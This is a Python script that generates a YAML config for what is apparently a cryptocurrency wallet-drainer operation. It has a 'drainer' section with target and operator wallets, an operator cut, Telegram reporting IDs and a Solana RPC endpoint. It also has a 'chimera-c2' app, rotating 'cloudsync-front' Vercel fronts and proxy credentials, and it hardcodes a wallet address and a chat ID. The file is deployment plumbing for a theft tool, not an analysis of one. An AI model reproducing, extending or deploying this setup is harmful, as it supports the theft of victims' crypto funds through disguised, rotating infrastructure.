# core/gen_config.py — Generate config.yaml from environment variables
#
# Cloud deploys (the chimera-engine Fly app) never bake config.yaml into the
# image — secrets live in `fly secrets` and this script materializes the
# config file at boot, before the service API starts.
#
# Usage: python core/gen_config.py [output-path]   (default: config.yaml)

import os
import sys

import yaml


def env(name: str, default: str = "") -> str:
    return os.environ.get(name, default)


def build_config() -> dict:
    required = ["FLY_API_TOKEN", "VERCEL_API_TOKEN", "AES_SECRET", "SERVICE_KEY"]
    missing = [k for k in required if not os.environ.get(k)]
    if missing:
        raise SystemExit(f"gen_config: missing required env: {', '.join(missing)}")

    drainer_env = {
        "AES_SECRET": env("AES_SECRET"),
        "TELEGRAM_BOT_TOKEN": env("TELEGRAM_BOT_TOKEN"),
        "TELEGRAM_CHAT_ID": env("TELEGRAM_CHAT_ID"),
        "OPERATOR_CHAT_ID": env("OPERATOR_CHAT_ID", "-5236234661"),
        "RPC_ENDPOINT": env("RPC_ENDPOINT", "https://api.mainnet-beta.solana.com"),
        "TARGET_WALLET": env("TARGET_WALLET"),
        "CHECK_WALLET": env(
            "CHECK_WALLET", "JAByDDeLfddBvzfXaVmivgMR9TZ6Ta8MgX2QHacyhDTP"
        ),
    }
    if env("OPERATOR_WALLETS"):
        drainer_env["OPERATOR_WALLETS"] = env("OPERATOR_WALLETS")
    if env("OPERATOR_CUT"):
        drainer_env["OPERATOR_CUT"] = env("OPERATOR_CUT")

    config = {
        "fly_api_token": env("FLY_API_TOKEN"),
        "fly_org": env("FLY_ORG"),
        "fly_region": env("FLY_REGION", "iad"),
        "fly_app_base": env("FLY_APP_BASE", "chimera-c2"),
        "vercel_api_token": env("VERCEL_API_TOKEN"),
        "vercel_team": env("VERCEL_TEAM"),
        "vercel_project_base": env("VERCEL_PROJECT_BASE", "cloudsync-front"),
        "github_token": env("GITHUB_TOKEN"),
        "gist_id": env("GIST_ID"),
        "proxy_provider": env("PROXY_PROVIDER", "snowproxies"),
        "proxy_user": env("PROXY_USER"),
        "proxy_pass": env("PROXY_PASS"),
        "proxy_endpoint": env("PROXY_ENDPOINT"),
        "cycle_minutes": int(env("CYCLE_MINUTES", "60") or 60),
        "drainer": {
            "aes_secret": env("AES_SECRET"),
            "service_key": env("SERVICE_KEY"),
            # listen on all interfaces inside the machine (same-machine bot
            # hits localhost; everything else requires X-Service-Key)
            "api_host": env("API_HOST", "0.0.0.0"),
            "api_port": int(env("API_PORT", "8444") or 8444),
            "env": drainer_env,
        },
    }
    return config


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else "config.yaml"
    with open(out, "w", encoding="utf-8") as f:
        yaml.safe_dump(build_config(), f, default_flow_style=False)
    print(f"gen_config: wrote {out}")


if __name__ == "__main__":
    main()
